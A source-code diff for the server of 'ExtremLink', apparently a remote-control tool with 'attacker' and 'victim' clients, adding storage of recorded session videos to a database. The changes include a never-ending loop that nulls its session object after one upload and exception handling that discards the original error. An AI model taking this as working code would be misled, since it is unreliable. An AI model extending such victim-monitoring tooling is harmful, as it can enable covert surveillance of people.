@@ -77,6 +77,13 @@ namespace ExtremLink_Server_v2.Classes
             set {  this.tempSessionMP4FileName = value;}
         }
 
+        private Session tempSession;
+        public Session TempSession
+        {
+            get { return this.tempSession; }
+            set { this.tempSession = value;}
+        }
+
         // Singleton behavior:
         private static Server serverInstance = null;
         public static Server ServerInstance
@@ -98,6 +105,7 @@ namespace ExtremLink_Server_v2.Classes
             this.serverIpAddress = this.FindIpAddress();
             this.attacker = new Client(this.serverIpAddress, TypeOfClient.attacker);
             this.victim = new Client(this.serverIpAddress, TypeOfClient.victim);
+            tempSessionMP4FileName = "tempSessionFile.mp4";
             Log.LogInstance.AddMessage("🖧 Server Started");
         }
 
@@ -190,6 +198,9 @@ namespace ExtremLink_Server_v2.Classes
                     case "^":
                         this.HandleKeyboardMessages(data);
                         break;
+                    case "📹🕑":
+                        this.HandleSessionRecordTimeFunction(data);
+                        break;
                 }
             }
         }
@@ -222,7 +233,10 @@ namespace ExtremLink_Server_v2.Classes
             // Output: The fucntion handle with session TCP packets which are sent by the attacker client.
             while (true)
             {
-                
+                byte[] sessionByteArr = FromMP4ToByteArr();
+                this.tempSession.VideoContent = sessionByteArr;
+                this.tempSession.UploadSessionToDatabase();
+                this.tempSession = null;
             }
         }
 
@@ -361,11 +375,16 @@ namespace ExtremLink_Server_v2.Classes
         {
             // Input: A string which represent the message of session's record time.
             // Output: The function handle with the given message.
+
             // Reading the data in json format
             dynamic message = JsonConvert.DeserializeObject(data);
 
             // Casting the data dynamic object to JObject
             JObject jsonData = (JObject)message;
+
+            DateTime sessionRecordTime = DateTime.Parse(message.RecordedTime);
+            string sessionUsername = this.attacker.User.UserName;
+            this.tempSession = new Session(sessionRecordTime, sessionUsername);
         }
 
 
@@ -459,20 +478,34 @@ namespace ExtremLink_Server_v2.Classes
 
 
         // Getting sessions function:
+        private byte[] FromMP4ToByteArr()
+        {
+            // Input: Nothing.
+            // Output: A byte array which represent the content of temp mp4 file and returns it's content in bytes.
+            try
+            {
+                return File.ReadAllBytes(this.tempSessionMP4FileName);
+            }
+            catch (Exception ex)
+            {
+                throw new Exception(ex.Message);
+            }
+        }
         public byte[] GetSession()
         {
             // Input: Nothing
             // Output: The function returns a byte array which represents an mp4 file.
-            using (FileStream fileStream = new FileStream(savePath, FileMode.Create, FileAccess.Write))
+            using (FileStream fileStream = new FileStream(this.tempSessionMP4FileName, FileMode.Create, FileAccess.Write))
             {
-                byte[] buffer = new byte[8192]; // 8 KB buffer
+                byte[] buffer = new byte[8192];
                 int bytesRead;
 
-                while ((bytesRead = clientSocket.Receive(buffer)) > 0)
+                while ((bytesRead = attacker.SessionTcpSocket.Receive(buffer)) > 0)
                 {
                     fileStream.Write(buffer, 0, bytesRead);
                 }
             }
+            return this.FromMP4ToByteArr();
         }
 
 
